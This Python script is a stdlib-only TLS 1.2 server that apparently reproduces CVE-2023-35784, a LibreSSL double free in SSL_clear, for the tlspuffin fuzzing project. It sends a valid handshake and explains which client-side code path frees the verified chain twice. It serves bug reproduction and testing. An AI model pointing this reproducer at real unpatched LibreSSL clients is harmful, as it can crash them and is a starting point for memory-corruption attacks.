#!/usr/bin/env python3
"""Raw TLS 1.2 server (stdlib only) for CVE-2023-35784 (LibreSSL SSL_clear double free / UAF).

Plays a legitimate TLS 1.2 server (ECDHE-RSA-CHACHA20-POLY1305, X25519) with the tlspuffin
test certificate. Every handshake message is built as raw bytes and printed in hex. The bug is not
in the bytes themselves: it is triggered on the *client* when the application calls SSL_clear()
on the finished connection (see client.c).

Why TLS 1.2: the ServerHello makes the client switch `s->method` away from the version-flexible
method. SSL_clear() then takes the ssl_free()+ssl_new() branch; ssl3_free() frees `verified_chain`
(set when the server certificate was processed) without NULLing it, and ssl3_new()->ssl3_clear()
frees it a second time.

Usage:
  tools/cve_2023_35784/server.py [--port 3000]
  tools/cve_2023_35784/client-libressl362-asan 127.0.0.1 3000
"""
import argparse
import hashlib
import hmac
import os
import socket
import struct
from pathlib import Path

ASSETS = Path(__file__).resolve().parents[2] / "tlspuffin" / "assets"
CHACHA20_POLY1305_SHA256 = 0xCCA8
X25519 = 0x001D
RSA_PKCS1_SHA256 = 0x0401


# --- crypto primitives (RFC 7748, RFC 8439) --------------------------------------------------------
def x25519(k: bytes, u: bytes) -> bytes:
    p = 2**255 - 19
    kk = bytearray(k)
    kk[0] &= 248
    kk[31] &= 127
    kk[31] |= 64
    k_int = int.from_bytes(kk, "little")
    x1 = int.from_bytes(u, "little") & ((1 << 255) - 1)
    x2, z2, x3, z3, swap = 1, 0, x1, 1, 0
    for t in reversed(range(255)):
        bit = (k_int >> t) & 1
        swap ^= bit
        if swap:
            x2, x3, z2, z3 = x3, x2, z3, z2
        swap = bit
        a, b = (x2 + z2) % p, (x2 - z2) % p
        aa, bb = a * a % p, b * b % p
        e = (aa - bb) % p
        c, d = (x3 + z3) % p, (x3 - z3) % p
        da, cb = d * a % p, c * b % p
        x3, z3 = (da + cb) ** 2 % p, x1 * (da - cb) ** 2 % p
        x2, z2 = aa * bb % p, e * (aa + 121665 * e) % p
    if swap:
        x2, x3, z2, z3 = x3, x2, z3, z2
    return (x2 * pow(z2, p - 2, p) % p).to_bytes(32, "little")


def _rotl(v, n):
    return ((v << n) & 0xFFFFFFFF) | (v >> (32 - n))


def chacha20_block(key: bytes, counter: int, nonce: bytes) -> bytes:
    s = list(struct.unpack("<4I", b"expand 32-byte k")) + list(struct.unpack("<8I", key))
    s += [counter] + list(struct.unpack("<3I", nonce))
    w = s[:]

    def qr(a, b, c, d):
        w[a] = (w[a] + w[b]) & 0xFFFFFFFF; w[d] = _rotl(w[d] ^ w[a], 16)
        w[c] = (w[c] + w[d]) & 0xFFFFFFFF; w[b] = _rotl(w[b] ^ w[c], 12)
        w[a] = (w[a] + w[b]) & 0xFFFFFFFF; w[d] = _rotl(w[d] ^ w[a], 8)
        w[c] = (w[c] + w[d]) & 0xFFFFFFFF; w[b] = _rotl(w[b] ^ w[c], 7)

    for _ in range(10):
        qr(0, 4, 8, 12); qr(1, 5, 9, 13); qr(2, 6, 10, 14); qr(3, 7, 11, 15)
        qr(0, 5, 10, 15); qr(1, 6, 11, 12); qr(2, 7, 8, 13); qr(3, 4, 9, 14)
    return struct.pack("<16I", *[(w[i] + s[i]) & 0xFFFFFFFF for i in range(16)])


def chacha20_xor(key: bytes, counter: int, nonce: bytes, data: bytes) -> bytes:
    out = bytearray()
    for i in range(0, len(data), 64):
        block = chacha20_block(key, counter + i // 64, nonce)
        out += bytes(a ^ b for a, b in zip(data[i : i + 64], block))
    return bytes(out)


def poly1305(key: bytes, msg: bytes) -> bytes:
    r = int.from_bytes(key[:16], "little") & 0x0FFFFFFC0FFFFFFC0FFFFFFC0FFFFFFF
    s = int.from_bytes(key[16:], "little")
    p, acc = (1 << 130) - 5, 0
    for i in range(0, len(msg), 16):
        n = int.from_bytes(msg[i : i + 16] + b"\x01", "little")
        acc = (acc + n) * r % p
    return ((acc + s) & ((1 << 128) - 1)).to_bytes(16, "little")


def _pad16(b: bytes) -> bytes:
    return b"\x00" * (-len(b) % 16)


def aead_encrypt(key, nonce, aad, pt):
    otk = chacha20_block(key, 0, nonce)[:32]
    ct = chacha20_xor(key, 1, nonce, pt)
    mac_data = aad + _pad16(aad) + ct + _pad16(ct) + struct.pack("<QQ", len(aad), len(ct))
    return ct + poly1305(otk, mac_data)


def aead_decrypt(key, nonce, aad, data):
    ct, tag = data[:-16], data[-16:]
    otk = chacha20_block(key, 0, nonce)[:32]
    mac_data = aad + _pad16(aad) + ct + _pad16(ct) + struct.pack("<QQ", len(aad), len(ct))
    if not hmac.compare_digest(poly1305(otk, mac_data), tag):
        raise ValueError("bad AEAD tag")
    return chacha20_xor(key, 1, nonce, ct)


# --- TLS 1.2 helpers -------------------------------------------------------------------------------
def prf(secret: bytes, label: bytes, seed: bytes, n: int) -> bytes:
    seed, out, a = label + seed, b"", label + seed
    while len(out) < n:
        a = hmac.new(secret, a, hashlib.sha256).digest()
        out += hmac.new(secret, a + seed, hashlib.sha256).digest()
    return out[:n]


def read_der_len(b, i):
    n = b[i + 1]
    if n < 0x80:
        return n, i + 2
    k = n & 0x7F
    return int.from_bytes(b[i + 2 : i + 2 + k], "big"), i + 2 + k


def load_rsa_key(path: Path):
    """Minimal PKCS#1 RSAPrivateKey parser: returns (n, d)."""
    b = path.read_bytes()
    _, i = read_der_len(b, 0)
    ints = []
    for _ in range(4):  # version, n, e, d
        ln, i = read_der_len(b, i)
        ints.append(int.from_bytes(b[i : i + ln], "big"))
        i += ln
    return ints[1], ints[3]


def rsa_pkcs1_sha256_sign(n: int, d: int, data: bytes) -> bytes:
    digest_info = bytes.fromhex("3031300d060960864801650304020105000420") + hashlib.sha256(data).digest()
    k = (n.bit_length() + 7) // 8
    em = b"\x00\x01" + b"\xff" * (k - len(digest_info) - 3) + b"\x00" + digest_info
    return pow(int.from_bytes(em, "big"), d, n).to_bytes(k, "big")


def hs(typ: int, body: bytes) -> bytes:
    return bytes([typ]) + struct.pack(">I", len(body))[1:] + body


def record(typ: int, payload: bytes) -> bytes:
    return bytes([typ]) + b"\x03\x03" + struct.pack(">H", len(payload)) + payload


def recv_record(sock, buf):
    while len(buf) < 5 or len(buf) < 5 + struct.unpack(">H", buf[3:5])[0]:
        chunk = sock.recv(4096)
        if not chunk:
            raise EOFError
        buf += chunk
    n = 5 + struct.unpack(">H", buf[3:5])[0]
    return buf[0], buf[5:n], buf[n:]


def parse_client_hello(msg: bytes):
    """msg: handshake message (with 4-byte header). Returns (random, suites, extension types)."""
    b = msg[4:]
    random, i = b[2:34], 34
    i += 1 + b[i]
    n = struct.unpack(">H", b[i : i + 2])[0]
    suites = [struct.unpack(">H", b[i + 2 + j : i + 4 + j])[0] for j in range(0, n, 2)]
    i += 2 + n
    i += 1 + b[i]
    exts, end = {}, i + 2 + struct.unpack(">H", b[i : i + 2])[0]
    i += 2
    while i < end:
        t, ln = struct.unpack(">HH", b[i : i + 4])
        exts[t] = b[i + 4 : i + 4 + ln]
        i += 4 + ln
    return random, suites, exts


ALERTS = {0: "close_notify", 10: "unexpected_message", 40: "handshake_failure", 70: "protocol_version"}


def serve(port: int, count: int):
    cert = (ASSETS / "alice.der").read_bytes()
    n, d = load_rsa_key(ASSETS / "alice-key.der")

    with socket.socket() as srv:
        srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        srv.bind(("0.0.0.0", port))
        srv.listen(1)
        print(f"[*] Listening on 0.0.0.0:{port} ...")
        for i in range(count):
            conn, addr = srv.accept()
            print(f"=== connection {i + 1}/{count}")
            handle(conn, addr, cert, n, d)


def handle(conn, addr, cert, n, d):
    with conn:
        print(f"[+] Connection from {addr}")
        buf = b""
        typ, ch, buf = recv_record(conn, buf)
        assert typ == 0x16 and ch[0] == 1, "expected a ClientHello"
        print(f"[>] ClientHello ({len(ch)} bytes): {ch.hex()}")
        client_random, suites, exts = parse_client_hello(ch)
        assert CHACHA20_POLY1305_SHA256 in suites, "client does not offer ECDHE-RSA-CHACHA20-POLY1305"
        transcript = ch

        # --- server flight, every message as raw bytes
        server_random = os.urandom(32)
        sh_exts = b"\xff\x01\x00\x01\x00" if 0xFF01 in exts or 0x00FF in suites else b""
        sh_body = (b"\x03\x03" + server_random + b"\x00"  # empty session_id: no resumption
                   + struct.pack(">H", CHACHA20_POLY1305_SHA256) + b"\x00"
                   + struct.pack(">H", len(sh_exts)) + sh_exts)
        server_hello = hs(2, sh_body)
        certificate = hs(11, struct.pack(">I", len(cert) + 3)[1:] + struct.pack(">I", len(cert))[1:] + cert)
        eph_priv = os.urandom(32)
        eph_pub = x25519(eph_priv, b"\x09" + b"\x00" * 31)
        params = b"\x03" + struct.pack(">H", X25519) + bytes([32]) + eph_pub
        sig = rsa_pkcs1_sha256_sign(n, d, client_random + server_random + params)
        ske = hs(12, params + struct.pack(">HH", RSA_PKCS1_SHA256, len(sig)) + sig)
        server_hello_done = hs(14, b"")
        for name, msg in (("ServerHello", server_hello), ("Certificate", certificate),
                          ("ServerKeyExchange", ske), ("ServerHelloDone", server_hello_done)):
            print(f"[<] {name} ({len(msg)} bytes): {msg.hex()[:96]}{'...' if len(msg) > 48 else ''}")
            conn.sendall(record(0x16, msg))
            transcript += msg

        # --- client flight: ClientKeyExchange, ChangeCipherSpec, Finished (encrypted)
        typ, cke, buf = recv_record(conn, buf)
        assert typ == 0x16 and cke[0] == 16, f"expected ClientKeyExchange, got {typ} {cke[:1].hex()}"
        transcript += cke
        client_pub = cke[5:5 + cke[4]]
        typ, ccs, buf = recv_record(conn, buf)
        assert typ == 0x14, "expected ChangeCipherSpec"
        typ, fin, buf = recv_record(conn, buf)
        assert typ == 0x16, "expected encrypted Finished"

        ms = prf(x25519(eph_priv, client_pub), b"master secret", client_random + server_random, 48)
        kb = prf(ms, b"key expansion", server_random + client_random, 88)
        cw_key, sw_key, cw_iv, sw_iv = kb[:32], kb[32:64], kb[64:76], kb[76:88]

        def nonce(iv, seq):
            return bytes(a ^ b for a, b in zip(iv, b"\x00" * 4 + struct.pack(">Q", seq)))

        def aad(seq, typ, ln):
            return struct.pack(">Q", seq) + bytes([typ]) + b"\x03\x03" + struct.pack(">H", ln)

        client_fin = aead_decrypt(cw_key, nonce(cw_iv, 0), aad(0, 0x16, len(fin) - 16), fin)
        expected = hs(20, prf(ms, b"client finished", hashlib.sha256(transcript).digest(), 12))
        assert client_fin == expected, "client Finished does not verify"
        print("[>] client Finished verified")
        transcript += client_fin

        server_fin = hs(20, prf(ms, b"server finished", hashlib.sha256(transcript).digest(), 12))
        conn.sendall(record(0x14, b"\x01"))
        conn.sendall(record(0x16, aead_encrypt(sw_key, nonce(sw_iv, 0), aad(0, 0x16, len(server_fin)), server_fin)))
        print("[<] ChangeCipherSpec + Finished sent: handshake complete")

        # --- wait for the client to go away (SSL_clear crashes it under ASAN)
        conn.settimeout(5)
        try:
            while True:
                typ, body, buf = recv_record(conn, buf)
                if typ == 0x15:
                    print(f"[>] alert record: {body.hex()}")
        except (EOFError, socket.timeout, ConnectionError):
            print("[*] client connection closed")


if __name__ == "__main__":
    ap = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
    ap.add_argument("--port", type=int, default=3000)
    ap.add_argument("--count", type=int, default=1, help="number of connections to serve in a row")
    a = ap.parse_args()
    serve(a.port, a.count)
